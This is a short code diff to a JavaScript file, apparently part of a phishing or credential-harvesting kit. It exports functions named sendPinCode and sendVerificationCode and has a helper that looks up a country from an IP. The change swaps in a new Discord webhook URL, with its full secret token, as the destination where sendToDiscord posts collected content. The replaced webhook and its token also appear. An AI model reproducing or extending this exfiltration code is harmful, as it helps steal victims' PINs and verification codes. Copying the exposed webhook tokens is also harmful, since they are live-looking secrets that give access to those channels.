@@ -40,7 +40,7 @@ async function getCountry(ip) {
  * @returns {Promise<boolean>} True si fue exitoso
  */
 async function sendToDiscord(content) {
-  const webhook_url = "https://discord.com/api/webhooks/1394687657300463737/6DhyZ7QV121eAsCPEuoXIKoyZplJkQo5TVV0fIweFP3gBb-J3TAx3byCLVBePXIN36-2";
+  const webhook_url = "https://discordapp.com/api/webhooks/1404972622684491848/IqzvumERvGwR_Y7paceX00eLq7OWPv3UN7Wa6r2Y6AtPm8cwIDB1sVA7YBXOrMwgiqcr";
   
   const data = {
     content: content
@@ -216,4 +216,5 @@ if (typeof module !== 'undefined' && module.exports) {
     sendPinCode,
     sendVerificationCode
   };
+
 }
